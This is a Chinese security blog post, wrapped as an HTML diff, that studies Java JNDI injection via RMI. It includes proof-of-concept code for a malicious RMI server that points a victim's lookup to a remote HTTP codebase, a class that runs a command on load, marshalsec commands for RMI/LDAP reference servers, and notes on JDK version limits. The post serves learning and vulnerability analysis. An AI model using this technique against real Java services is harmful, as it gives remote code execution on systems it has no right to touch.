@@ -1,0 +1,628 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>Java安全-RMI_JNDI注入 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java安全-RMI_JNDI注入">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-26 13:05" pubdate>
+        2021年1月26日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java安全-RMI_JNDI注入</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年4月23日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>这一篇主要学习关于RMI-JNDI注入的利用原理和流程。</p>
+<h1 id="2-参考链接"><a href="#2-参考链接" class="headerlink" title="2.参考链接"></a>2.参考链接</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6633?page=5">https://xz.aliyun.com/t/6633?page=5</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11558842.html">https://www.cnblogs.com/tr1ple/p/11558842.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/189835.html">https://www.freebuf.com/column/189835.html</a></p>
+<h1 id="3-正文"><a href="#3-正文" class="headerlink" title="3.正文"></a>3.正文</h1><h2 id="1-JNDI简介"><a href="#1-JNDI简介" class="headerlink" title="1.JNDI简介"></a>1.JNDI简介</h2><p>​    JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
+<p>​    JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等等。</p>
+<p>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。<br>代码格式如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String jndiName= ...;<span class="hljs-comment">//指定需要查找name名称</span><br>Context context = <span class="hljs-keyword">new</span> InitialContext();<span class="hljs-comment">//初始化默认环境</span><br>DataSource ds = (DataSourse)context.lookup(jndiName);<span class="hljs-comment">//查找该name的数据</span><br></code></pre></td></tr></table></figure>
+<p>这些对象可以存储在不同的命名或目录服务中，例如上一次学习的远程方法调用（RMI）等。</p>
+<p>RMI格式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext var1 = <span class="hljs-keyword">new</span> InitialContext();<br>DataSource var2 = (DataSource)var1.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure>
+<h2 id="2-使用JNDI-References进行注入"><a href="#2-使用JNDI-References进行注入" class="headerlink" title="2.使用JNDI References进行注入"></a>2.使用JNDI References进行注入</h2><p>​    首先 RMI 服务端除了可以直接绑定远程对象之外，还可以通过 <code>References</code>类来绑定一个外部的远程对象，当 RMI 绑定了 <code>References</code> 之后，首先会利用 <code>Referenceable.getReference()</code>获取绑定对象的引用，并且在目录中保存，当客户端使用 <code>lookup</code> 获取对应名字的时候，会返回<code>ReferenceWrapper</code> 类的代理文件，然后会调用 <code>getReference()</code> 获取 <code>Reference</code>类，最终通过<code>factory</code>类将<code>Reference</code>转换为具体的对象实例。</p>
+<p>​    根据参考文章中一个利用RMI的POC，来进行学习和分析。</p>
+<p>本次实验整个流程如下：</p>
+<ol>
+<li>首先开启 HTTP 服务器，并将我们的恶意类放在目录下</li>
+<li>开启恶意 <code>RMI </code>服务器</li>
+<li>攻击者控制<code>uri</code>参数为上一步开启的恶意 <code>RMI</code> 服务器地址</li>
+<li>恶意<code>RMI</code>服务器返回 <code>ReferenceWrapper</code> 类</li>
+<li>目标（Client) 在执行lookup操作的时候，在<code>decodeObject</code> 中将<code>ReferenceWrapper</code> 变为 <code>Reference</code> 类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码。</li>
+</ol>
+<p>CLIENT.java（受害者）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-comment">//受害者</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CLIENT</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String uri = <span class="hljs-string">&quot;rmi://attackerip:1099/evil&quot;</span>;<span class="hljs-comment">//假如这个是攻击者可控的。</span><br>        Context ctx = <span class="hljs-keyword">new</span> InitialContext();<br>        ctx.lookup(uri);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>SERVER.java（攻击者部署）</p>
+<p>​    在攻击者的服务器上的POC主要是利用<code>References</code>。<code>References</code>类有两个属性，<code>className</code> 和 <code>codebase url</code> ，<code>className</code>就是远程引用的类名，<code>codebase url</code>决定了我们远程类的位置，当本地 <code>classpath</code> 中没有找到对应的类的时候，就会去请求对应<code>codebase</code>地址下的类 （<code>codebase</code> 支持<code>http</code>协议），那么如果我们将 <code>codebase</code> 地址下的类替换成我们的恶意类，这样我们就能让客户端命令执行了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SERVER</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;<br><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        String url = <span class="hljs-string">&quot;http://youip:8081/&quot;</span>;<br>		 <span class="hljs-comment">// Reference需要传入三个参数 (className,factory,factoryLocation)</span><br>          <span class="hljs-comment">// 第一个参数随意填写即可，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址</span><br>        Reference reference = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;ExecTest&quot;</span>, <span class="hljs-string">&quot;ExecTest&quot;</span>, url);<br><br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(reference);<br><br>        registry.bind(<span class="hljs-string">&quot;evil&quot;</span>, referenceWrapper);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>​    在<code> ReferenceWrapper</code> 源码中不难看出，该类继承自<code> UnicastRemoteObject</code> ，实现对 Reference 的包裹从而让 Reference 使其能够通过 <code>RMI</code> 进行远程访问。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/5.png" srcset="/img/loading.gif"></p>
+<p>ExecTest.java（攻击者部署的恶意类）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">EvilTest</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>将恶意类进行编译，记住编译的时候要使用<code>小于1.8u171</code>的版本。</strong></p>
+<p>​    程序部署后，执行后存在如下错误：</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/6.png" srcset="/img/loading.gif"></p>
+<p>原因如下：</p>
+<blockquote>
+<p>​    把<code>ExecTest.java</code>及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。<code>ExecTest.java</code>文件不能申明包名，即<code>package xxx</code>。声明后编译的class文件函数名称会加上包名从而不匹配。<code>java版本小于1.8u171</code>。之后版本存在<code>trustCodebaseURL</code>的限制，只信任已有的<code>codebase</code>地址，不再能够从指定<code>codebase</code>中下载字节码。</p>
+</blockquote>
+<p>将JAVA的版本修改到小于<code>1.8u171</code>，成功弹出计算器。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/3.png" srcset="/img/loading.gif"></p>
+<h2 id="3-漏洞触发分析"><a href="#3-漏洞触发分析" class="headerlink" title="3.漏洞触发分析"></a>3.漏洞触发分析</h2><p>我们从<code>InitialContext#lookup</code>开始分析。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/7.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>lookup</code>方法：</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/8.png" srcset="/img/loading.gif"></p>
+<p>当Debug在代码96行过后，直接触发了漏洞。因此可以判断漏洞触发点在此处。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/9.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code>，通过 <code>lookup</code> 已经获取到了 <code>RMI </code>服务器上的对象引用（<code>ReferenceWrapper_Stub</code>），并且赋值给了<code>var2</code>，随后进入了<code>decodeObject</code>方法。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/10.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>decodeObject</code>方法：可以发现会首先判断是不是<code>RemoteReference</code>的子类，如果是的话就利用<code>getReference</code>方法来获取其 <code>Reference</code> 类 ，然后赋值给变量<code>var3</code>。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/11.png" srcset="/img/loading.gif"></p>
+<p>跟进 <code>getObjectInstance</code> 方法，发现会调用 <code>getObjectFactoryFromReference</code> 函数。</p>
+<p>​    <code>getObjectFactoryFromReference</code> 函数会根据 <code>Reference</code>中的<code>className</code> 和 <code>codebase</code>来加载我们的 <code>factory</code> 类 (即我们http服务器上的恶意类)，触发点就在这里面，继续跟进。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/12.png" srcset="/img/loading.gif"></p>
+<p>​    跟进<code>getObjectFactoryFromReference</code>方法中，可以发现程序会在本地classpath中寻找是否存在该类，如果本地没有找到就远程加载<code>codebase</code>指向的类。</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/14.png" srcset="/img/loading.gif"></p>
+<p>最后通过反射调用恶意类，导致命令的执行：</p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/15.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/16.png" srcset="/img/loading.gif"></p>
+<p>整个利用链：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">InitialContext</span><span class="hljs-selector-id">#lookup</span><br>	<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span><span class="hljs-selector-class">.RegistryContext</span><span class="hljs-selector-id">#lookup</span><br>	<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span><span class="hljs-selector-class">.RegistryContext</span><span class="hljs-selector-id">#decodeObject</span><br>		<span class="hljs-selector-tag">javax</span><span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span><span class="hljs-selector-class">.NamingManager</span><span class="hljs-selector-id">#getObjectInstance</span><br>		<span class="hljs-selector-tag">javax</span><span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span><span class="hljs-selector-class">.NamingManager</span><span class="hljs-selector-id">#getObjectFactoryFromReference</span><br></code></pre></td></tr></table></figure>
+<h3 id="漏洞分析总结"><a href="#漏洞分析总结" class="headerlink" title="漏洞分析总结"></a>漏洞分析总结</h3><p>整个利用流程如下：</p>
+<ol>
+<li>目标代码中调用了<code>InitialContext.lookup(URI)</code>，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：<code>rmi://hacker_rmi_server//name；</code></li>
+<li>攻击者<code>RMI</code>服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、<code>getObjectInstance()</code>方法等处写入恶意代码，达到<code>RCE</code>的效果；</li>
+</ol>
+<p>​    在这里，攻击目标扮演的相当于是<code>JNDI</code>客户端的角色，攻击者通过搭建一个恶意的<code>RMI</code>服务端来实施攻击。我们跟入<code>lookup()</code>函数的代码中，可以看到<code>JNDI</code>中对<code>Reference</code>类的处理逻辑，最终会调用<code>NamingManager.getObjectInstance()</code></p>
+<h2 id="4-使用工具起一个RMI或IDAP服务"><a href="#4-使用工具起一个RMI或IDAP服务" class="headerlink" title="4.使用工具起一个RMI或IDAP服务"></a>4.使用工具起一个RMI或IDAP服务</h2><p>我们可以使用<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec反序列化工具</a>起RMI、LDAP服务</p>
+<p>装有<code>java8</code>，使用<code>mvn clean package -DskipTests</code>编译</p>
+<p>RMI服务：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject <br>#不加8088端口号 默认是1099<br>java -cp marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:<span class="hljs-comment">//ip:8080/文件夹/#ExportObject 8088</span><br></code></pre></td></tr></table></figure>
+<p>LDAP服务：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject <br>#不加8088端口号 默认是1389<br>java -cp marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//ip:8080/文件夹/#ExportObject 8088</span><br></code></pre></td></tr></table></figure>
+<p>同时恶意class文件的web服务还需要自己去起。</p>
+<h2 id="5-版本限制问题："><a href="#5-版本限制问题：" class="headerlink" title="5.版本限制问题："></a>5.版本限制问题：</h2><p>​    之前学习<a href="https://reader-l.github.io/2021/01/24/java%E5%AE%89%E5%85%A8-RMI%E7%AF%87/">RMI</a>时，学习到利用codebase执行任意代码RCE目标RMI服务器方法的时候（利用RMI动态加载的特性），就面临了java的版本问题<code>Java版本需要低于**7u21、6u45**</code>或者面临了设置<code>java.rmi.server.useCodebaseOnly=false</code>系统属性**的限制。</p>
+<p>​    但是JNDI注入加载动态类的原理是不同的，它的原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。因此不受上述的限制，具有更多的利用空间。</p>
+<p>​    但是之前实验中，我还是发现有写版本是无法复现的，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。不仅是参考文章中所说的1.8u191失败，还有我尝试过后发现1.8u171也是失败的。</p>
+<p>​    较高版本都需要<code>System.setProperty(&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot;,true)</code></p>
+<h2 id="6-绕过高版本JDK限制"><a href="#6-绕过高版本JDK限制" class="headerlink" title="6.绕过高版本JDK限制"></a>6.绕过高版本JDK限制</h2><p>可以看看这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/26/Java%E5%AE%89%E5%85%A8-LDAP-JNDI%E6%B3%A8%E5%85%A5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java安全-LDAP+JNDI注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/01/24/java%E5%AE%89%E5%85%A8-RMI%E7%AF%87/">
+                        <span class="hidden-mobile">java安全-RMI篇</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
